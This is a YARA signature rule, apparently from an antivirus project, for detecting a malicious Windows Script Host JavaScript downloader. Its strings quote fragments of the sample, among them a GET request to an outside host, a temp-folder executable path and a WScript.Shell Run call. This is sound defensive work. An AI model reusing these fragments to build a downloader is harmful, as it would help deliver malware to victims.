rule sig_20160329_d34deac637fcf4fdb768025e7aba910c {
  meta:
    description = "datamaliciousorder - file 20160329_d34deac637fcf4fdb768025e7aba910c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8b53e5393f3ae03a165d4118a5d6bd49323f9eaa0c5fa4277a9354e050bc5803"

  strings:
    $s1  = "zl[Cn](\"GET\", \"http://dealingdeuces.com/o4pskd\", false);" fullword ascii
    $s2  = "function RO() {return C[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"yuJNPp8iL.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[sn](B() * 11); if (zl[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function c(CG, V0){nZ = nZ * 1; return CG - V0;};" fullword ascii
    $s5  = "var C = function D() {return WScript[yD](\"WScript.Shell\");}(), Ee = 11;" fullword ascii
    $s6  = "function J(){return \"\" + q;};" fullword ascii
    $s7  = "function E() {return ((nC == true) && (nC == Q)) ? 1 : nZ;};" fullword ascii
    $s8  = "function N(HU){C[\"Run\"](HU, nZ, nZ);};" fullword ascii
    $s9  = "function B(){return 22;};" fullword ascii
    $s10 = "var K = new this[\"Date\"]();" fullword ascii
    $s11 = "function i()" fullword ascii
    $s12 = " while (a0){" fullword ascii
    $s13 = "return c(Ae, Ib);" fullword ascii
    $s14 = "function a(Et) {var w0 = (1, 2, 3, 4, 5, Et); return w0;};" fullword ascii
    $s15 = "function Mf(){return yD;};" fullword ascii
    $s16 = "Q = true; " fullword ascii
    $s17 = "var Q = false;" fullword ascii
    $s18 = "var h0 = false;" fullword ascii
    $s19 = "nC = true; " fullword ascii
    $s20 = "var nC = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}